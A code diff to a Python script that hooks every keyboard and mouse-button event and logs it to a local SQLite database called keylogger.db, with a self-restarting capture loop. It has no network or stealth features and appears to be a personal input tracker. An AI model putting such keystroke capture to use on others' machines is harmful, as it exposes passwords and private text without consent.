@@ -1,9 +1,8 @@
+import time
 import keyboard
+import mouse
 import sqlite3
 
-"""
-{'event_type': 'up', 'scan_code': 57, 'time': 1736107166.0214162, 'device': None, 'is_keypad': False, 'modifiers': None, 'name': 'space'}
-"""
 
 with sqlite3.connect("keylogger.db") as conn:
     cursor = conn.cursor()
@@ -18,20 +17,39 @@ with sqlite3.connect("keylogger.db") as conn:
 
 last_event = None
 
-def register_keypress(event):
-    global last_event
 
+def register_event(event_name, event_type, is_repeat_event=False):
+    print('register: ', event_name, event_type)
     with sqlite3.connect("keylogger.db") as conn:
         cursor = conn.cursor()
-
-        is_repeat_event = event.name + event.event_type == last_event
-
         cursor.execute(
             'INSERT INTO events (name, event_type, is_repeat) VALUES (?, ?, ?)',
-            (event.name, event.event_type, int(is_repeat_event))
+            (event_name, event_type, is_repeat_event)
         )
 
-        last_event = event.name + event.event_type
+def register_keyboard_event(event):
+    global last_event
 
-keyboard.hook(register_keypress)
-keyboard.wait()
+    is_repeat_event = event.name + event.event_type == last_event
+    register_event(event.name, event.event_type, int(is_repeat_event))
+    last_event = event.name + event.event_type
+
+
+def register_mouse_event(event):
+    if type(event) != mouse.ButtonEvent: 
+        return
+
+    register_event('mouse_' + event.button, event.event_type)
+
+
+if __name__ == "__main__":
+    while True:
+        try:
+            keyboard.hook(register_keyboard_event)
+            mouse.hook(register_mouse_event)
+            keyboard.wait()
+        except Exception as e:
+            print(e)
+        
+        print('Reinitializing')
+        time.sleep(5)
